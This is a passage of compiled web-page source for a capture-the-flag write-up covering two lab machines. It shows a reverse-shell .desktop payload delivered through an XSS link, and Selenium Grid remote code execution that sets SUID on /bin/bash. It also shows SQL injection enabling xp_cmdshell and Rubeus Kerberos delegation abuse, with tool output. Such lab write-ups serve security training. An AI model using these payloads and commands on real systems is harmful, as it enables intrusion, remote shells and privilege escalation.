punctuation\",children:\"]\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token key attr-name\",children:\"Exec\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token value attr-value\",children:'bash -c \"bash -i \u003e\u0026 /dev/tcp/10.10.14.57/443 0\u003e\u00261\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token key attr-name\",children:\"Type\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token value attr-value\",children:\"Application\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will trick the user to open our link, which will be passed to \",(0,e.jsx)(n.code,{children:\"shell.openExternal\"}),\":\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-html\",children:(0,e.jsx)(n.code,{className:\"language-html code-highlight\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c\"}),\"a\"]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"className\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"an\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"open\"}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"href\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"LINK\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),\"test\",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c/\"}),\"a\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]})})}),`\n`,(0,e.jsx)(n.p,{children:\"At this point, we don\\u2019t know whether the bot will download the script or not. We can try both approachs.\"}),`\n`,(0,e.jsxs)(n.ol,{children:[`\n`,(0,e.jsx)(n.li,{children:\"The easy way is just to host the file in a localwebserver.\"}),`\n`]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-html\",children:(0,e.jsx)(n.code,{className:\"language-html code-highlight\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c\"}),\"a\"]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"className\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"an\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"open\"}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"href\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"http://ip:port/pwn.desktop\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),\"test\",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c/\"}),\"a\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]})})}),`\n`,(0,e.jsxs)(n.ol,{start:\"2\",children:[`\n`,(0,e.jsxs)(n.li,{children:[\"The other way is to hope that downloads the file.\",`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:\"Spoilers: the bot also downloads the file u.u\"}),`\n`]}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.p,{children:[\"We know from the source that it gets downloaded in \",(0,e.jsx)(n.code,{children:\"/opt/userland\"}),\" and we retrieve the random file name with two ways as well.\"]}),`\n`,(0,e.jsxs)(n.ol,{children:[`\n`,(0,e.jsx)(n.li,{children:\"Downloading the file locally using the gui, we need to create a writeable /opt/userland in our local system)\"}),`\n`,(0,e.jsx)(n.li,{children:\"Using the Web API to upload the file and the filename will be in the response\"}),`\n`]}),`\n`,(0,e.jsx)(n.p,{children:\"In this case our payload will be:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-html\",children:(0,e.jsx)(n.code,{className:\"language-html code-highlight\",children:(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c\"}),\"a\"]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"className\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"an\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"open\"}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"href\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"file:///opt/userland/5b208f3cb06c3d4a44afa8c948f9aa35.desktop\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),\"test\",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c/\"}),\"a\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]})})}),`\n`,(0,e.jsx)(n.p,{children:\"Once we make sure the payload is hosted/downloaded we can send the HTML payload and wait until we get a shell.\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/payload-xss-rendered.png\",alt:\"A screenshot that shows that our XSS payload is rendered\"})}),`\n`,(0,e.jsx)(n.p,{children:\"And we get a shell back!\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/user-flag-john.png\",alt:\"A screenshot where we got a shell back as john\"})}),`\n`,(0,e.jsxs)(n.h3,{id:\"privilege-escalation-1\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#privilege-escalation-1\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Privilege Escalation\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"The first thing I\\u2019ve checked is the running processes as \",(0,e.jsx)(n.code,{children:\"root\"}),\". In this case, I\\u2019ve found a Selenium server running as root locally.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"root         \",(0,e.jsx)(n.span,{className:\"token number\",children:\"623\"}),\"       \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"14\"}),`:12 ?        00:00:00 /usr/sbin/cron -f -P\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"root         \",(0,e.jsx)(n.span,{className:\"token number\",children:\"638\"}),\"     \",(0,e.jsx)(n.span,{className:\"token number\",children:\"623\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"14\"}),\":12 ?        00:00:00  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),`_ /usr/sbin/CRON -f -P\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"root         \",(0,e.jsx)(n.span,{className:\"token number\",children:\"641\"}),\"     \",(0,e.jsx)(n.span,{className:\"token number\",children:\"638\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"14\"}),\":12 ?        00:00:00      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),\"_ /bin/sh -c java -jar /root/selenium-server-4.4.0.jar standalone --host \",(0,e.jsx)(n.span,{className:\"token number\",children:\"127.0\"}),`.0.1\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"root         \",(0,e.jsx)(n.span,{className:\"token number\",children:\"643\"}),\"     \",(0,e.jsx)(n.span,{className:\"token number\",children:\"641\"}),\"  \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"14\"}),\":12 ?        00:00:31          \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\\\\\"}),\"_ java -jar /root/selenium-server-4.4.0.jar standalone --host \",(0,e.jsx)(n.span,{className:\"token number\",children:\"127.0\"}),`.0.1\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"The idea behind exploiting Selenium is to create a session that executes code. In simpler words, we can achieve RCE through geckodriver.\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"First I\\u2019ll forward the port \",(0,e.jsx)(n.code,{children:\"4444\"}),\" running locally on the machine to my local machine using \",(0,e.jsx)(n.code,{children:\"chisel\"}),\". I\\u2019ll run a chisel server on my machine:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`hcue@pjsk:~/htb-trustable \\xBB chisel server -p 8888 --reverse\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 06:10:10 server: Reverse tunnelling enabled\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 06:10:10 server: Fingerprint H7MAdhulXPbLGvJaJWk7UmAzd8e/4NPB4rlR4eDaklQ=\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 06:10:10 server: Listening on http://0.0.0.0:8888\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Download chisel to the remote machine and I\\u2019ll forward the port:\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`john@electrogrid:/dev/shm$ wget 10.10.14.57/chisel\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`john@electrogrid:/dev/shm$ chmod +x ./chisel\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`john@electrogrid:/dev/shm$ ./chisel client 10.10.14.57./chisel client 10.10.14.57:8888 R:4444:127.0.0.1:4444 \u0026\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`./chisel client 10.10.14.57:8888 R:4444:127.0.0.1:4444 \u0026\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And we\\u2019ll get a connection.\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`2022/12/05 06:11:47 server: session#1: tun: proxy#R:4444=\u003e4444: Listening\n`})})}),`\n`,(0,e.jsx)(n.p,{children:\"Now we can access the Selenium Grid from our machine.\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/selenium-grid-web.png\",alt:\"A screenshot of Selenium web grid interface\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"And now I\\u2019ll create the malicious session where it will set the \",(0,e.jsx)(n.code,{children:\"suid\"}),\" bit to the \",(0,e.jsx)(n.code,{children:\"/bin/bash\"}),\" binary.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-http\",children:(0,e.jsxs)(n.code,{className:\"language-http code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token request-line\",children:[(0,e.jsx)(n.span,{className:\"token method property\",children:\"POST\"}),\" \",(0,e.jsx)(n.span,{className:\"token request-target url\",children:(0,e.jsxs)(n.span,{className:\"token path\",children:[(0,e.jsx)(n.span,{className:\"token path-separator\",children:\"/\"}),\"wd\",(0,e.jsx)(n.span,{className:\"token path-separator\",children:\"/\"}),\"hub\",(0,e.jsx)(n.span,{className:\"token path-separator\",children:\"/\"}),\"session\"]})}),\" \",(0,e.jsx)(n.span,{className:\"token http-version property\",children:\"HTTP/1.1\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Host\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"localhost:4444\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"User-Agent\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"python-requests/2.27.1\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Accept-Encoding\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"gzip, deflate\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Accept\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"*/*\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Connection\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"close\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Type\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"application/json;charset=utf-8\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token header\",children:[(0,e.jsx)(n.span,{className:\"token header-name keyword\",children:\"Content-Length\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\" \",(0,e.jsx)(n.span,{className:\"token header-value\",children:\"276\"})]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:` {\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    \"capabilities\": {\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`        \"alwaysMatch\": {\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`            \"browserName\": \"chrome\",\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`            \"goog:chromeOptions\": {\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`                \"binary\": \"/usr/bin/python3\",\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`                \"args\": [\"-cimport os;os.system('chmod u+s /bin/bash')\"]\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`            }\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`        }\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    }\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`}\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"After making the request, we can see in the UI that our request is in queue.\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/selenium-web-queue.png\",alt:\"A screenshot of the Selenium Web queue that shows our payload\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Once it disappears from the queue, it means it\\u2019s finished.\"}),`\n`,(0,e.jsx)(n.p,{children:\"We can go back to the remote machine and check.\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`john@electrogrid:/dev/shm$ ls -la /bin/bash           ls -la /bin/bash\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`ls -la /bin/bash\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And it worked!\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`john@electrogrid:/dev/shm$ /bin/bash -p               /bin/bash -p\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/bin/bash -p\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`id\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`uid=1000(john) gid=1000(john) euid=0(root) groups=1000(john)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`cat /root/root.txt\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`STF22{bbe7145febbce7ddd4dd3e22a37e93d1}\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And thats it for this one!\"}),`\n`,(0,e.jsxs)(n.h2,{id:\"lookout-fullpwn-2000-points\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#lookout-fullpwn-2000-points\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Lookout (Fullpwn, 2000 Points)\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Note: This will be a short writeup as I used two unintended ways to get system on the machine.\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"enumeration-2\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#enumeration-2\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Enumeration\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"I\\u2019ll start with an \",(0,e.jsx)(n.code,{children:\"nmap\"}),\" scan with the usual options:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 80/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 135/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 445/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 139/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 53/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 3269/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 389/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 88/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 636/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 3268/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 593/tcp on 10.129.254.249\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Discovered open port 464/tcp on 10.129.254.249\n`})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"For the sake of the writeup, I\\u2019ll jump straight to the webserver on port 80, where we have a way to execute some commands such as \",(0,e.jsx)(n.code,{children:\"ping\"}),\", \",(0,e.jsx)(n.code,{children:\"traceroute\"}),\", and \",(0,e.jsx)(n.code,{children:\"nslookup\"}),\".\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/Lookout-Utility-WebPage.png\",alt:\"A screenshot of the Lookout Utility WebPage\"})}),`\n`,(0,e.jsx)(n.p,{children:\"This page is not vulnerable to anything, so I\\u2019ll just ping my box for now:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/Scan-Results.png\",alt:\"A screenshot of the Scan Results that we runned through the utility\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We can check in the \",(0,e.jsx)(n.code,{children:\"Past Scans\"}),\" that our scan was created!\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/Past-Results.png\",alt:\"A screenshot that shows all the Past Results\"})}),`\n`,(0,e.jsx)(n.p,{children:\"We can notice that we delete the scan with the X under action. I\\u2019ll intercept that request using burp to play a bit with it:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/request-delete-scan.png\",alt:\"A screenshot that shows the request delete scan\"})}),`\n`,(0,e.jsx)(n.p,{children:\"After a few tries, I noticed it was vulnerable to an SQLi:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/testing-sqli-sleep.png\",alt:\"A screenshot where we test testing SQLi sleep and that shows the 5 seconds delay\"})}),`\n`,(0,e.jsxs)(n.h3,{id:\"exploitation-2\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#exploitation-2\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Exploitation\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"The first thing I\\u2019ve tried was to enable \",(0,e.jsx)(n.code,{children:\"xp_cmdshell\"}),\" and use it get code execution:\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`EXEC sp_configure 'show advanced options', 1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`RECONFIGURE-- -\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`EXEC sp_configure 'xp_cmdshell', '1'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`RECONFIGURE\n`})]})}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/configure1.png\",alt:\"A screenshot of xp_cmdshell configuration\"})}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/configure2.png\",alt:\"A screenshot of xp_cmdshell configuration\"})}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/configure3.png\",alt:\"A screenshot of xp_cmdshell configuration\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Then we can use \",(0,e.jsx)(n.code,{children:\"EXEC xp_cmdshell '\u003cCOMMAND\u003e'\"}),\".\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/rce-sqli.png\",alt:\"A screenshot of executing xp_cmdshell to get a reverse shell through powershell\"})}),`\n`,(0,e.jsx)(n.p,{children:\"And we get a shell as the nt service:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/shell-as-service-nt.png\",alt:\"A screenshot of getting a shell as nt service\"})}),`\n`,(0,e.jsxs)(n.blockquote,{children:[`\n`,(0,e.jsx)(n.p,{children:\"Nothing that we can directly get a shell with sqlmap\"}),`\n`]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/stack-the-flags-2022/sqlmap-result.png\",alt:\"A screenshot that shows the sqlmap results\"})}),`\n`,(0,e.jsxs)(n.h3,{id:\"privilege-escalation-2\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#privilege-escalation-2\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Privilege Escalation\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Since we have a shell as service account. we can get system directly with two ways.\"}),`\n`,(0,e.jsxs)(n.h4,{id:\"first-way\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#first-way\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"First Way\"]}),`\n`,(0,e.jsx)(n.p,{children:\"The Service accounts are vulnerable to TGT delegation attacks using Rubeus because the service account is often configured with high privileges on the local system, such as the ability to create and modify user accounts and other system resources.\"}),`\n`,(0,e.jsx)(n.p,{children:\"The idea is to get valid TGT (Ticket-Granting Ticket) for the service account, to perform a DCSync attack and then PSExec into the machine as administrator.\"}),`\n`,(0,e.jsx)(n.p,{children:\"First I\\u2019ll upload Rubeus to the remove machine.\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`PS C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\u003e wget 10.10.14.57/Rubeus.exe -o r.exe\n`})})}),`\n`,(0,e.jsx)(n.p,{children:\"Then I\\u2019ll use it to generate a TGT for the service account.\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`PS C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\u003e .\\\\r.exe tgtdeleg /nowrap\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`.\\\\r.exe tgtdeleg /nowrap\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   ______        _\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`  (_____ \\\\      | |\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`   _____) )_   _| |__  _____ _   _  ___\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`  |  __  /| | | |  _ \\\\| ___ | | | |/___)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`  | |  \\\\ \\\\| |_| | |_) ) ____| |_| |___ |\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`  |_|   |_|____/|____/|_____)____/(___/\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`  v2.2.0\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Action: Request Fake Delegation TGT (current user)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/LOOKOUT-DC.LOOKOUT.local'\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Kerberos GSS-API initialization success!\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Found the AP-REQ delegation ticket in the GSS-API output.\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Authenticator etype: aes256_cts_hmac_sha1\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] Extracted the service ticket session key from the ticket cache: CYLfo1W5+vf4ZTDXhdsbhxx6n45eG6ONzEKGryITLUg=\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[+] Successfully decrypted the authenticator\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`[*] 